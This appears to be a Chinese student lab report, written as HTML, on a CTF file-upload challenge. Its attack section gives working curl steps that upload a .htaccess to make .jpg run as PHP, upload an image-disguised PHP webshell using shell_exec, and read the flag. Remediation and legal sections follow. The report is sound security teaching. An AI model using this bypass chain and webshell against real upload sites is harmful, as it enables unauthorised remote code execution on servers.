@@ -1,0 +1,227 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>信息安全实验报告 — 第 40 题 文件上传组合拳</title>
+<style>
+  *{box-sizing:border-box}
+  body{margin:0;background:#fff;color:#1f2937;
+    font-family:"PingFang SC","Microsoft YaHei",sans-serif;
+    line-height:1.8;font-size:16px;}
+  .wrap{max-width:880px;margin:0 auto;padding:40px 32px 80px;}
+  .cover{border:1px solid #e5e7eb;border-radius:12px;padding:28px 32px;
+    background:linear-gradient(135deg,#eff6ff,#dbeafe);margin-bottom:32px;}
+  .cover h1{margin:0 0 8px;font-size:26px;color:#1e3a8a;}
+  .cover .sub{color:#1e3a8a;font-size:17px;font-weight:600;margin-bottom:14px;}
+  .meta{display:grid;grid-template-columns:1fr 1fr;gap:6px 24px;
+    color:#6b7280;font-size:14px;}
+  .meta b{color:#1f2937;}
+  h2{font-size:22px;margin:36px 0 14px;padding-bottom:8px;
+    border-bottom:3px solid #0b5fff;color:#1e3a8a;}
+  h3{font-size:17px;margin:22px 0 8px;color:#1e3a8a;}
+  p,li{font-size:15.5px;}
+  ul,ol{padding-left:22px;}
+  code{background:#f1f5f9;color:#0f172a;padding:1px 6px;border-radius:4px;
+    font-family:"SF Mono","Consolas",monospace;font-size:13.5px;}
+  pre{background:#0f172a;color:#e2e8f0;padding:14px 16px;
+    border-radius:8px;overflow-x:auto;font-size:13.5px;line-height:1.65;
+    font-family:"SF Mono","Consolas",monospace;}
+  pre code{background:transparent;color:inherit;padding:0;}
+  table{width:100%;border-collapse:collapse;margin:10px 0;font-size:14.5px;}
+  th,td{border:1px solid #e5e7eb;padding:8px 12px;text-align:left;vertical-align:top;}
+  th{background:#f8fafc;font-weight:600;}
+  .callout{border-left:4px solid #0b5fff;background:#eff6ff;
+    padding:10px 16px;margin:14px 0;border-radius:0 8px 8px 0;}
+  .key{background:#fef3c7;border-left:4px solid #b45309;
+    padding:10px 16px;margin:14px 0;border-radius:0 8px 8px 0;}
+  .step{border:1px solid #e5e7eb;border-radius:10px;padding:14px 18px;
+    margin:14px 0;background:#fafafa;}
+  .step h3{margin-top:0;}
+  .badge{display:inline-block;background:#0b5fff;color:#fff;
+    padding:2px 10px;border-radius:6px;font-size:13px;margin-right:8px;}
+  .figure{margin:14px 0;text-align:center;}
+  .placeholder{border:2px dashed #cbd5e1;background:#f8fafc;color:#6b7280;
+    padding:42px 24px;border-radius:8px;font-size:14px;}
+  figcaption{margin-top:6px;color:#6b7280;font-size:13.5px;}
+  .flag{background:#0f172a;color:#22d3ee;padding:16px 22px;border-radius:10px;
+    font-family:"SF Mono","Consolas",monospace;font-size:15.5px;margin:14px 0;}
+  .three{display:grid;grid-template-columns:repeat(3,1fr);gap:14px;margin:14px 0;}
+  .card{border:1px solid #e5e7eb;border-radius:10px;padding:14px 16px;background:#fff;}
+  .card h4{margin:0 0 8px;color:#1e3a8a;font-size:15.5px;}
+  .card ul{padding-left:18px;margin:0;}
+  .card li{font-size:14.5px;line-height:1.65;}
+  @media print{
+    .wrap{padding:0;max-width:none;}
+    .cover{background:#fff;}
+    pre,.flag{background:#f1f5f9;color:#0f172a;border:1px solid #e5e7eb;}
+  }
+</style>
+</head>
+<body>
+<div class="wrap">
+
+<div class="cover">
+  <h1>信息安全综合实验报告</h1>
+  <div class="sub">第 40 题 · 文件上传组合拳（<code>.htaccess</code> + 图片马 → RCE）</div>
+  <div class="meta">
+    <div><b>姓名：</b>__________________</div>
+    <div><b>日期：</b>2026 年 6 月 2 日</div>
+    <div><b>班级：</b>__________________</div>
+    <div><b>学号：</b>__________________</div>
+  </div>
+</div>
+
+<!-- ============== 一、漏洞原理 ============== -->
+<h2>一、漏洞原理</h2>
+
+<p>目标是一个 Apache + PHP 的图片上传站点，开发者设了三道防线，但每一道都有缺陷，三个缺陷叠加形成完整 RCE 链。</p>
+
+<table>
+  <tr><th width="60">#</th><th width="180">防线</th><th>缺陷</th></tr>
+  <tr>
+    <td>①</td>
+    <td>扩展名黑名单<br>（php/phtml/phar…）</td>
+    <td><b>漏了 <code>.htaccess</code></b>。<code>pathinfo('.htaccess')</code> 取后缀结果是空字符串 <code>""</code>，不在黑名单内。</td>
+  </tr>
+  <tr>
+    <td>②</td>
+    <td>MIME 白名单<br>（image/jpeg…）</td>
+    <td>只读请求里的 <code>Content-Type</code>，<b>完全由攻击者控制</b>，伪造成 <code>image/jpeg</code> 即可。</td>
+  </tr>
+  <tr>
+    <td>③</td>
+    <td>Apache 解析机制</td>
+    <td>开启了 <code>AllowOverride All</code>，<b>上传目录里的 <code>.htaccess</code> 能改解析规则</b>，把 <code>.jpg</code> 当 PHP 执行。</td>
+  </tr>
+</table>
+
+<div class="key">
+  <b>核心利用链（背诵口诀）：</b><br>
+  <b>传 <code>.htaccess</code> 改解析 → 传图片马（图片头 + PHP 代码）→ 访问 jpg 触发 RCE → 读 flag</b>
+</div>
+
+<h3>关键知识点</h3>
+<ul>
+  <li><b><code>.htaccess</code> 指令</b>：<code>AddType application/x-httpd-php .jpg</code>，让当前目录下所有 <code>.jpg</code> 都交给 <code>mod_php</code> 解析。</li>
+  <li><b>图片马</b>：文件头是合法 JFIF 二进制（绕图片类型检测），后面拼 <code>&lt;?php ... ?&gt;</code> 代码。<b>同一个文件，看是图片，执行是 webshell</b>。</li>
+  <li><b>黑名单 vs 白名单</b>：黑名单总会漏（这里漏了 <code>.htaccess</code>），白名单才安全。</li>
+  <li><b>MIME 校验正确做法</b>：用 <code>finfo_file()</code> / <code>exif_imagetype()</code> 读文件真实魔数，不信 <code>$_FILES['type']</code>。</li>
+</ul>
+
+<!-- ============== 二、攻击实现 ============== -->
+<h2>二、攻击实现</h2>
+
+<p>全程 3 个 HTTP 请求，使用系统自带 <code>curl</code> 即可完成。先设环境变量：</p>
+<pre><code>B=http://目标IP:端口</code></pre>
+
+<!-- Step 1 -->
+<div class="step">
+  <h3><span class="badge">Step 1</span>上传 <code>.htaccess</code> 改解析规则</h3>
+  <pre><code>echo 'AddType application/x-httpd-php .jpg' &gt; /tmp/ht
+curl -s "$B/" -F "file=@/tmp/ht;filename=.htaccess;type=image/jpeg"</code></pre>
+  <p><b>三个关键参数：</b></p>
+  <ul>
+    <li><code>filename=.htaccess</code> — 显式指定文件名（默认会用本地 basename "ht"）。</li>
+    <li><code>type=image/jpeg</code> — 伪造 MIME 骗过白名单。</li>
+    <li>文件后缀为空，黑名单匹配不到。</li>
+  </ul>
+  <div class="figure">
+    <div class="placeholder">📷 截图：Step 1 终端 + 服务器返回 <code>/uploads/.htaccess</code></div>
+    <figcaption>图 1 <code>.htaccess</code> 上传成功</figcaption>
+  </div>
+</div>
+
+<!-- Step 2 -->
+<div class="step">
+  <h3><span class="badge">Step 2</span>上传图片马 <code>shell.jpg</code></h3>
+  <pre><code># JFIF 头（让 exif_imagetype 判为图片）
+printf '\xff\xd8\xff\xe0\x00\x10JFIF\x00\x01\x01\x00\x00\x01\x00\x01\x00\x00' &gt; /tmp/shell.jpg
+# 追加 PHP 一句话（必须单引号，防 bash 展开 $_GET）
+printf '%s' '&lt;?php echo "FLAG:".shell_exec($_GET["c"]); ?&gt;' &gt;&gt; /tmp/shell.jpg
+# 上传
+curl -s "$B/" -F "file=@/tmp/shell.jpg;type=image/jpeg"</code></pre>
+  <div class="callout">
+    <b>易错点：</b>PHP 代码里有 <code>$_GET</code>，<b>必须用单引号包裹</b>，否则 bash 会把它当变量展开成空，写进文件的 PHP 就废了。
+  </div>
+  <div class="figure">
+    <div class="placeholder">📷 截图：Step 2 上传响应返回 <code>/uploads/shell.jpg</code></div>
+    <figcaption>图 2 图片马上传成功</figcaption>
+  </div>
+</div>
+
+<!-- Step 3 -->
+<div class="step">
+  <h3><span class="badge">Step 3</span>触发 RCE 读 flag</h3>
+  <pre><code>curl -s "$B/uploads/shell.jpg?c=cat+/flag" | strings | grep FLAG</code></pre>
+  <p>Apache 因 <code>.htaccess</code> 已经把 <code>.jpg</code> 交给 PHP 处理，<code>?c=</code> 参数被 <code>shell_exec</code> 执行。返回前半是 JFIF 二进制乱码，<code>strings</code> 过滤出可打印字符即可看到 flag。</p>
+  <div class="figure">
+    <div class="placeholder">📷 截图（关键得分点）：终端输出 FLAG: 行 + 完整 flag</div>
+    <figcaption>图 3 RCE 成功 · 读取到 flag</figcaption>
+  </div>
+  <div class="flag">✅ FLAG = TOGOGO-flag{xxxxxxxxxxxxxxxxxxxx}</div>
+</div>
+
+<h3>三道门是如何被全部突破的</h3>
+<pre><code>上传 .htaccess:  ext=""        黑名单不匹配 ✔   type=image/jpeg 白名单通过 ✔
+上传 shell.jpg:  ext="jpg"     不在黑名单内 ✔   type=image/jpeg 白名单通过 ✔
+触发执行:        .htaccess 已生效，.jpg 交给 mod_php，&lt;?php ?&gt; 被执行 ✔</code></pre>
+
+<!-- ============== 三、防护措施 ============== -->
+<h2>三、防护措施（个人 / 管理 / 国家 三层面）</h2>
+
+<div class="three">
+
+  <div class="card">
+    <h4>① 个人 / 开发者</h4>
+    <ul>
+      <li><b>白名单代替黑名单</b>：只允许 <code>jpg/png/gif</code>，其余一律拒绝。</li>
+      <li><b>校验真实类型</b>：用 <code>finfo_file()</code> 读文件魔数，不信 <code>$_FILES['type']</code>。</li>
+      <li><b>重命名 + 随机化</b>：<code>uniqid().'.jpg'</code>，杜绝 <code>.htaccess</code>、双扩展名。</li>
+      <li><b>关闭上传目录脚本执行</b>：<code>php_admin_flag engine off</code>。</li>
+      <li><b>禁用 <code>AllowOverride</code></b>：根本上让 <code>.htaccess</code> 失效。</li>
+      <li><b>存储到非 WebRoot</b>：通过下载脚本输出，禁止直链访问。</li>
+    </ul>
+  </div>
+
+  <div class="card">
+    <h4>② 企业 / 管理</h4>
+    <ul>
+      <li><b>SDL 安全开发生命周期</b>：上传功能在设计阶段就强制威胁建模。</li>
+      <li><b>统一文件服务</b>：所有业务接入集中文件网关 + 对象存储，下线自研接口。</li>
+      <li><b>WAF 纵深防御</b>：网关层拦截 <code>.htaccess</code>、<code>.user.ini</code>、双扩展名等高危文件名。</li>
+      <li><b>权限最小化</b>：上传目录挂载 <code>noexec</code>，Web 进程独立低权账户运行。</li>
+      <li><b>日志告警</b>：对 <code>/uploads/</code> 下新出现的可执行文件触发实时告警。</li>
+      <li><b>定期红蓝对抗</b>：每年至少 1 次第三方渗透测试验证补丁有效性。</li>
+    </ul>
+  </div>
+
+  <div class="card">
+    <h4>③ 国家 / 法律</h4>
+    <ul>
+      <li><b>《网络安全法》</b>（2017）：网络运营者必须履行安全保护义务，违者追责。</li>
+      <li><b>《数据安全法》</b>（2021）：数据分级分类管理，重大泄露可追刑责。</li>
+      <li><b>《个人信息保护法》</b>（2021）：最高可处营业额 5% 罚款。</li>
+      <li><b>等保 2.0</b>：三级以上系统必须满足边界完整性、入侵防范要求，文件上传是必查项。</li>
+      <li><b>CNVD / CNNVD 漏洞库</b>：国家级漏洞收集与协调修复机制。</li>
+      <li><b>护网行动</b>：实战化攻防演练倒逼各单位真实加固。</li>
+    </ul>
+  </div>
+
+</div>
+
+<div class="key">
+  <b>三层协同：</b>开发者写出正确代码 → 企业用 SDL 和 WAF 兜底 → 国家用立法和等保强制推动。任何单层都靠不住，<b>纵深防御</b>才是答案。
+</div>
+
+<h3>对本题的具体修复建议</h3>
+<ol>
+  <li>把 <code>.htaccess</code> 和 <code>.user.ini</code> 加入黑名单，<b>更彻底的做法是改白名单</b>。</li>
+  <li>服务端用 <code>finfo_file()</code> 读文件真实 MIME。</li>
+  <li>Apache 配置 <code>AllowOverride None</code> + 上传目录 <code>php_admin_flag engine off</code>。</li>
+  <li>上传后强制重命名（<code>uniqid().'.jpg'</code>），不保留原文件名。</li>
+</ol>
+
+</div>
+</body>
+</html>
